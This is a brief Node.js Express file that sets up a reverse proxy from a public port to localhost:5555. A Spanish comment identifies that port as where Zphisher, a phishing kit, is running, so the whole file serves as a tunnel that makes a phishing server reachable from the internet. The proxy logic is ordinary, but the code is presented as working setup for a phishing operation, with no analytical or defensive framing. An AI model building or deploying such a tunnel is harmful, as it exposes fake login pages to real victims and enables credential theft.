const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();

// Puerto local donde corre Zphisher
const target = 'http://localhost:5555';

app.use('/', createProxyMiddleware({ target, changeOrigin: true }));

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Tunnel activo en el puerto ${PORT}`);
});
